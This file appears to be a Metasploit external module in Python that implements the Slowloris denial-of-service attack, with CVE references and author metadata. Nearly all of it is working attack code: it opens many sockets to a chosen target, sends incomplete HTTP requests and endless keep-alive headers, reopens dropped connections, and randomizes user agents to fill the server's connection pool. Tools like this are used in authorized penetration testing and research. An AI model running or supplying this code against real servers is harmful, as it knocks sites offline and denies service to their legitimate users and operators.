#!/usr/bin/env python
# Note, works with both python 2.7 and 3

import random
import socket
import ssl
import sys
import time

from metasploit import module, user_agent

metadata = {
    'name': 'Slowloris Denial of Service Attack',
    'description': '''
        Slowloris tries to keep many connections to the target web server open and hold them open as long as possible.
        It accomplishes this by opening connections to the target web server and sending a partial request.
        Periodically, it will send subsequent HTTP headers, adding to-but never completing-the request.
        Affected servers will keep these connections open, filling their maximum concurrent connection pool,
        eventually denying additional connection attempts from clients.
     ''',
    'authors': [
        'RSnake',  # Vulnerability disclosure
        'Gokberk Yaltirakli',  # Simple slowloris in Python
        'Daniel Teixeira',  # Metasploit module (Ruby)
        'Matthew Kienow <matthew_kienow[AT]rapid7.com>'  # Metasploit external module (Python)
    ],
    'date': '2009-06-17',
    'references': [
        {'type': 'cve', 'ref': '2007-6750'},
        {'type': 'cve', 'ref': '2010-2227'},
        {'type': 'url', 'ref': 'https://www.exploit-db.com/exploits/8976/'},
        {'type': 'url', 'ref': 'https://github.com/gkbrk/slowloris'}
     ],
    'type': 'dos',
    'options': {
        'rhost': {'type': 'address', 'description': 'The target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'The target port', 'required': True, 'default': 80},
        'sockets': {'type': 'int', 'description': 'The number of sockets to use in the attack', 'required': True, 'default': 150},
        'delay': {'type': 'int', 'description': 'The delay between sending keep-alive headers', 'required': True, 'default': 15},
        'ssl': {'type': 'bool', 'description': 'Negotiate SSL/TLS for outgoing connections', 'required': True, 'default': False},
        'rand_user_agent': {'type': 'bool', 'description': 'Randomizes user-agent with each request', 'required': True, 'default': True}
     }}

list_of_sockets = []

def init_socket(host, port, use_ssl=False, rand_user_agent=True):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if use_ssl:
        s = ssl.wrap_socket(s)

    s.connect((host, port))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))

    agent = user_agent.most_common
    if rand_user_agent:
        agent = user_agent.random
    s.send("User-Agent: {}\r\n".format(agent).encode("utf-8"))

    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s

def run(args):
    host = args['rhost']
    port = int(args['rport'])
    use_ssl = args['ssl'] == "true"
    rand_user_agent = args['rand_user_agent'] == "true"
    socket_count = int(args['sockets'])
    delay = int(args['delay'])

    module.log("Attacking %s with %s sockets" % (host, socket_count), 'info')

    module.log("Creating sockets...", 'info')
    for i in range(socket_count):
        try:
            module.log("Creating socket number %s" % (i), 'debug')
            s = init_socket(host, port, use_ssl=use_ssl, rand_user_agent=rand_user_agent)
        except socket.error:
            break
        list_of_sockets.append(s)

    while True:
        module.log("Sending keep-alive headers... Socket count: %s" % len(list_of_sockets), 'info')
        for s in list(list_of_sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                list_of_sockets.remove(s)

        for _ in range(socket_count - len(list_of_sockets)):
            module.log("Recreating socket...", 'debug')
            try:
                s = init_socket(host, port, use_ssl=use_ssl, rand_user_agent=rand_user_agent)
                if s:
                    list_of_sockets.append(s)
            except socket.error:
                break
        time.sleep(delay)

if __name__ == "__main__":
    module.run(metadata, run)
